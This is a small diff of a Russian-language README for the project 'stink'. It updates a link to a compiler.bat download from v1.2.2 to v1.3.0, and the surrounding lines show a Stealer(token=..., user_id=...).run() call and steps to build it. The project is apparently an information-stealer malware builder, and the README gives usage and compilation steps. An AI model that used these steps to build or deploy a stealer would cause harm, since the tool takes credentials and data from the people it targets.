@@ -144,7 +144,7 @@ Stealer(token="YOUR_TOKEN", user_id=YOUR_ID).run()
 ```
 
 ### С помощью BAT
-1. Загружаем [компилятор](https://github.com/FallenAstaroth/stink/releases/download/v1.2.2/compiler.bat).
+1. Загружаем [компилятор](https://github.com/FallenAstaroth/stink/releases/download/v1.3.0/compiler.bat).
 2. Помещаем его в одну директорию с файлом test.py.
 3. Запускаем compiler.bat.
 
